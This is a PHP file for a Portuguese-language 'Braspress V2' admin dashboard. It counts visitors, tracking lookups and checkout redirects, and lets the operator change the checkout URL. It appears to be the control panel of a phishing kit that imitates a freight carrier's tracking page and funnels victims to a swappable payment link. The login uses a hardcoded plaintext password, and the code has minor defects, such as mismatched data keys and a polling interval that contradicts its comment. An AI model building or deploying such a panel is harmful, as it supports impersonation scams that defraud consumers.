<?php
// Configurações de segurança
session_start();
// Processo de logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}
// Usuário e senha fixos (armazenados em hash para maior segurança)
$usuario_valido = "e7_admin";
$senha_hash = password_hash("135790Dvl@", PASSWORD_DEFAULT);
// Verifica se o usuário está logado
if (!isset($_SESSION['logado']) || $_SESSION['logado'] !== true) {
    // Processa o login se o formulário for enviado
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $usuario = isset($_POST['usuario']) ? trim($_POST['usuario']) : '';
        $senha = isset($_POST['senha']) ? $_POST['senha'] : '';
        if ($usuario === $usuario_valido && password_verify($senha, $senha_hash)) {
            $_SESSION['logado'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            header("Cache-Control: no-cache, no-store, must-revalidate"); // HTTP 1.1.
            header("Pragma: no-cache"); // HTTP 1.0.
            exit();
        } else {
            $erro_login = "Usuário ou senha incorretos!";
        }
        // Se for uma requisição AJAX, retorna resposta JSON
        if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
            $json_file = '../dados/visitantes.json';
            $dados = file_exists($json_file) ? json_decode(file_get_contents($json_file), true) : [
                'visitors_count' => 0,
                'rastreios_count' => 0,
                'checkout' => 0
            ];
            header('Content-Type: application/json');
            echo json_encode([
                'success' => false,
                'message' => $erro_login,
                'data' => $dados
            ]);
            exit();
        }
    }
    // Exibe o formulário de login
    ?>
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login - Painel Braspress Admin</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <script src="https://cdn.jsdelivr.net/npm/flowbite@2.5.1/dist/flowbite.min.js"></script>
        <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
        <style>
            body {
                font-family: 'Poppins', sans-serif;
                background: linear-gradient(135deg, #f5f7fa 0%, #e4e7eb 100%);
            }
            .login-card {
                backdrop-filter: blur(10px);
                background: rgba(255, 255, 255, 0.9);
                border-radius: 20px;
                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
                border: 1px solid rgba(255, 255, 255, 0.2);
            }
            .input-focus:focus {
                box-shadow: 0 0 0 3px rgba(249, 115, 22, 0.3);
            }
            .logo-text {
                background: linear-gradient(to right, #f97316, #f59e0b);
                -webkit-background-clip: text;
                background-clip: text;
                -webkit-text-fill-color: transparent;
                color: transparent;
            }
        </style>
    </head>
    <body class="flex items-center justify-center min-h-screen text-gray-800 p-4">
        <div class="w-full max-w-md p-8 space-y-8 login-card">
            <div class="text-center">
                <h2 class="text-4xl font-bold flex items-center justify-center gap-3">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-orange-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4" />
                    </svg>
                    <span class="logo-text">BRASPRESS V2</span>
                </h2>
                <p class="text-gray-500 mt-2 text-lg">Painel administrativo</p>
            </div>
            <?php if (isset($erro_login)): ?>
                <div class="p-4 mb-4 text-sm text-red-700 bg-red-100 rounded-xl border border-red-200 flex items-center gap-2" role="alert">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                    </svg>
                    <?php echo htmlspecialchars($erro_login); ?>
                </div>
            <?php endif; ?>
            <form class="mt-8 space-y-6" method="POST">
                <div class="space-y-5">
                    <div>
                        <label for="usuario" class="block mb-2 text-sm font-medium text-gray-700">Usuário</label>
                        <div class="relative">
                            <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                                </svg>
                            </div>
                            <input type="text" name="usuario" id="usuario" class="input-focus w-full pl-10 px-4 py-3 text-gray-800 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 focus:outline-none placeholder-gray-400" placeholder="Digite seu usuário" required>
                        </div>
                    </div>
                    <div>
                        <label for="senha" class="block mb-2 text-sm font-medium text-gray-700">Senha</label>
                        <div class="relative">
                            <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                                </svg>
                            </div>
                            <input type="password" name="senha" id="senha" class="input-focus w-full pl-10 px-4 py-3 text-gray-800 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 focus:outline-none placeholder-gray-400" placeholder="Digite sua senha" required>
                        </div>
                    </div>
                </div>
                <div>
                    <button type="submit" class="w-full py-3 px-4 bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-600 hover:to-amber-600 text-white font-medium rounded-xl transition-all duration-300 flex items-center justify-center gap-2 shadow-lg transform hover:scale-[1.02]">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1" />
                        </svg>
                        Entrar
                    </button>
                </div>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit();
}
// Lê os dados de estatísticas do arquivo JSON
$json_file = '../dados/visitantes.json';
$dados = file_exists($json_file) ? json_decode(file_get_contents($json_file), true) : [
    'visitors_count' => 0,
    'rastreios_count' => 0,
    'checkout' => 0
];
// Lê a URL de checkout do arquivo TXT
$url_file = '../dados/url.txt';
$url_atual = file_exists($url_file) ? trim(file_get_contents($url_file)) : 'https://checkout.example.com';
// Processa requisições AJAX
if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
    $response = ['success' => false, 'message' => 'Operação inválida'];
    // Atualiza dados
    if (isset($_POST['get_data'])) {
        $response = [
            'success' => true,
            'visitors_count' => $dados['visitantes'],
            'rastreios_count' => $dados['rastreios_count'],
            'checkout' => $dados['checkout'],
            'url_checkout' => $url_atual
        ];
    }
    // Zera contadores
    if (isset($_POST['acao']) && $_POST['acao'] === 'zerar_contadores') {
        $dados['visitantes'] = 0;
        $dados['rastreios_count'] = 0;
        $dados['checkout'] = 0;
        file_put_contents($json_file, json_encode($dados));
        $response = [
            'success' => true,
            'message' => 'Contadores zerados com sucesso!'
        ];
    }
    // Altera URL de checkout
    if (isset($_POST['acao']) && $_POST['acao'] === 'alterar_url' && isset($_POST['nova_url'])) {
        $nova_url = filter_var($_POST['nova_url'], FILTER_VALIDATE_URL);
        if ($nova_url) {
            file_put_contents($url_file, $nova_url);
            $url_atual = $nova_url;
            $response = [
                'success' => true,
                'message' => 'URL de checkout atualizada com sucesso!'
            ];
        } else {
            $response = [
                'success' => false,
                'message' => 'URL inválida. Por favor, insira uma URL válida.'
            ];
        }
    }
    header('Content-Type: application/json');
    echo json_encode($response);
    exit();
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel Admin - Braspress</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/flowbite@2.5.1/dist/flowbite.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f8fafc;
        }
        .sidebar {
            background: #ffffff;
            border-right: 1px solid #e5e7eb;
        }
        .sidebar-link {
            color: #6b7280;
            border-radius: 0.5rem;
            transition: all 0.3s ease;
        }
        .sidebar-link:hover {
            background: #f3f4f6;
            color: #111827;
        }
        .sidebar-link.active {
            background: #fff7ed;
            color: #f97316;
        }
        .dashboard-card {
            background: white;
            border-radius: 1rem;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03);
            transition: all 0.3s ease;
        }
        .dashboard-card:hover {
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.08), 0 4px 6px -2px rgba(0, 0, 0, 0.04);
        }
        .action-card {
            background: white;
            border-radius: 1rem;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03);
        }
        .stat-value {
            font-size: 2.5rem;
            font-weight: 700;
            line-height: 1;
        }
        .stat-label {
            color: #6b7280;
            font-size: 0.875rem;
            margin-top: 0.5rem;
        }
        .logo-text {
            background: linear-gradient(to right, #f97316, #f59e0b);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            color: transparent;
            font-weight: 700;
        }
    </style>
</head>
<body class="flex min-h-screen">
    <!-- Sidebar -->
    <div class="w-64 shrink-0 sidebar hidden lg:block">
        <div class="h-full flex flex-col p-4">
            <div class="p-4">
                <h2 class="text-2xl font-bold flex items-center gap-3">
                    <span class="logo-text">BRASPRESSV2</span>
                </h2>
                <p class="text-sm text-gray-500 mt-1">Painel Administrativo</p>
            </div>
            <div class="mt-2">
                <a href="#" class="flex items-center px-6 py-3 sidebar-link active">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" />
                    </svg>
                    Dashboard
                </a>
                <a href="<?php echo $_SERVER['PHP_SELF'] . '?logout=1'; ?>" class="flex items-center px-6 py-3 text-red-600 sidebar-link">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
                    </svg>
                    Sair
                </a>
            </div>
        </div>
    </div>
    <!-- Main Content -->
    <main class="flex-1 p-8">
        <div class="flex justify-between items-center mb-8">
            <h1 class="text-3xl font-semibold text-gray-800">Painel de Controle</h1>
            <div class="flex items-center gap-3">
                <div class="bg-orange-100 text-orange-800 text-xs font-medium px-3 py-1.5 rounded-full">
                    Admin
                </div>
            </div>
        </div>
        <!-- Status Cards -->
        <button type="button" id="reset-stats" class="w-full py-3 px-4 bg-red-500 hover:bg-red-600 text-white font-medium rounded-xl transition-all duration-300 flex items-center justify-center gap-2 transform hover:-translate-y-1 mb-4">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
             <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
            </svg>
                Resetar Estatísticas
        </button>
        <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
            <div class="dashboard-card p-6">
                <h3 class="text-lg font-semibold text-gray-700 mb-4">Visitantes</h3>
                <div class="flex items-center justify-between">
                    <div class="stat-value text-blue-600" id="visitors-count"><?php echo $dados['visitantes']; ?></div>
                    <div class="p-3 bg-blue-100 rounded-full">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197M13 7a4 4 0 11-8 0 4 4 0 018 0z" />
                        </svg>
                    </div>
                </div>
                <p class="stat-label">Total de visitantes únicos</p>
            </div>
            <div class="dashboard-card p-6">
                <h3 class="text-lg font-semibold text-gray-700 mb-4">Rastreios</h3>
                <div class="flex items-center justify-between">
                    <div class="stat-value text-purple-600" id="rastreios-count"><?php echo $dados['rastreios_count']; ?></div>
                    <div class="p-3 bg-purple-100 rounded-full">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-purple-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01" />
                        </svg>
                    </div>
                </div>
                <p class="stat-label">Total de rastreios consultados</p>
            </div>
            <div class="dashboard-card p-6">
                <h3 class="text-lg font-semibold text-gray-700 mb-4">Checkout</h3>
                <div class="flex items-center justify-between">
                    <div class="stat-value text-green-600" id="checkout-count"><?php echo $dados['checkout']; ?></div>
                    <div class="p-3 bg-green-100 rounded-full">
                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 3h2l.4 2M7 13h10l4-8H5.4M7 13L5.4 5M7 13l-2.293 2.293c-.63.63-.184 1.707.707 1.707H17m0 0a2 2 0 100 4 2 2 0 000-4zm-8 2a2 2 0 11-4 0 2 2 0 014 0z" />
                        </svg>
                    </div>
                </div>
                <p class="stat-label">Total de redirecionamentos ao checkout</p>
            </div>
        </div>
        <!-- Ações -->
        <div class="mb-8">
                <div class="action-card p-6">
                    <div class="flex items-center gap-4 mb-4">
                        <div class="p-3 bg-indigo-100 rounded-xl">
                            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-indigo-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
                            </svg>
                        </div>
                        <div>
                            <h3 class="text-lg font-semibold text-gray-700">URL de Checkout</h3>
                            <p class="text-sm text-gray-500">URL atual: <span class="text-indigo-600" id="current-url"><?php echo htmlspecialchars($url_atual); ?></span></p>
                        </div>
                    </div>
                    <div class="mb-4">
                        <input type="url" id="nova-url" class="w-full px-4 py-3 text-gray-800 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 focus:outline-none" placeholder="https://exemplo.com/checkout" required>
                    </div>
                    <button type="button" id="update-url" class="w-full py-3 px-4 bg-indigo-500 hover:bg-indigo-600 text-white font-medium rounded-xl transition-all duration-300 flex items-center justify-center gap-2 transform hover:-translate-y-1">
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0l-4 4m4-4v12" />
                        </svg>
                        Atualizar URL
                    </button>
                </div>
            </div>
        </div>
        <!-- Últimas atividades -->
        
    </main>
</div>

<!-- Toast de notificação -->
<div id="toast-notification" class="fixed hidden bottom-4 right-4 max-w-sm p-4 text-gray-800 bg-white rounded-xl shadow-lg transition-all duration-300 ease-in-out border-l-4 border-green-500 flex items-center gap-3">
    <div class="flex-shrink-0">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
        </svg>
    </div>
    <div id="toast-message" class="text-sm font-medium"></div>
    <button type="button" class="ml-auto -mx-1.5 -my-1.5 text-gray-400 hover:text-gray-600 focus:outline-none p-1" onclick="hideToast()">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
        </svg>
    </button>
</div>

<script>
    // Função para mostrar o toast
    function showToast(message, type = 'success') {
        const toast = document.getElementById('toast-notification');
        const toastMsg = document.getElementById('toast-message');
        toastMsg.textContent = message;
        
        // Define a cor da borda baseada no tipo
        if (type === 'error') {
            toast.classList.remove('border-green-500');
            toast.classList.add('border-red-500');
            toast.querySelector('svg').classList.remove('text-green-500');
            toast.querySelector('svg').classList.add('text-red-500');
        } else {
            toast.classList.remove('border-red-500');
            toast.classList.add('border-green-500');
            toast.querySelector('svg').classList.remove('text-red-500');
            toast.querySelector('svg').classList.add('text-green-500');
        }
        
        toast.classList.remove('hidden');
        toast.classList.add('flex');
        
        // Esconde o toast após 5 segundos
        setTimeout(hideToast, 5000);
    }
    
    // Função para esconder o toast
    function hideToast() {
        const toast = document.getElementById('toast-notification');
        toast.classList.add('hidden');
        toast.classList.remove('flex');
    }
    
    // Zerar contadores
    document.getElementById('reset-stats').addEventListener('click', function() {
        if (confirm('Tem certeza que deseja zerar todos os contadores?')) {
            fetch('<?php echo $_SERVER['PHP_SELF']; ?>', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: 'acao=zerar_contadores'
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    document.getElementById('visitors-count').textContent = '0';
                    document.getElementById('rastreios-count').textContent = '0';
                    document.getElementById('checkout-count').textContent = '0';
                    showToast(data.message);
                } else {
                    showToast(data.message, 'error');
                }
            })
            .catch(error => {
                console.error('Erro:', error);
                showToast('Erro ao processar a solicitação.', 'error');
            });
        }
    });
    
    // Atualizar URL
    document.getElementById('update-url').addEventListener('click', function() {
        const novaUrl = document.getElementById('nova-url').value;
        
        if (!novaUrl) {
            showToast('Por favor, insira uma URL válida.', 'error');
            return;
        }
        
        fetch('<?php echo $_SERVER['PHP_SELF']; ?>', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: `acao=alterar_url&nova_url=${encodeURIComponent(novaUrl)}`
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                document.getElementById('current-url').textContent = novaUrl;
                document.getElementById('nova-url').value = '';
                showToast(data.message);
            } else {
                showToast(data.message, 'error');
            }
        })
        .catch(error => {
            console.error('Erro:', error);
            showToast('Erro ao processar a solicitação.', 'error');
        });
    });
    
    // Atualiza os dados a cada 30 segundos
    function atualizarDados() {
        fetch('<?php echo $_SERVER['PHP_SELF']; ?>', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: 'get_data=1'
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                document.getElementById('visitors-count').textContent = data.visitors_count;
                document.getElementById('rastreios-count').textContent = data.rastreios_count;
                document.getElementById('checkout-count').textContent = data.checkout;
                document.getElementById('current-url').textContent = data.url_checkout;
            }
        })
        .catch(error => {
            console.error('Erro ao atualizar dados:', error);
        });
    }
    
    // Atualiza os dados a cada 30 segundos
    setInterval(atualizarDados, 1000);
    
    // Inicializa os tooltips do Flowbite
    if (typeof initFlowbite === 'function') {
        initFlowbite();
    }
</script>
</body>
</html>


                            
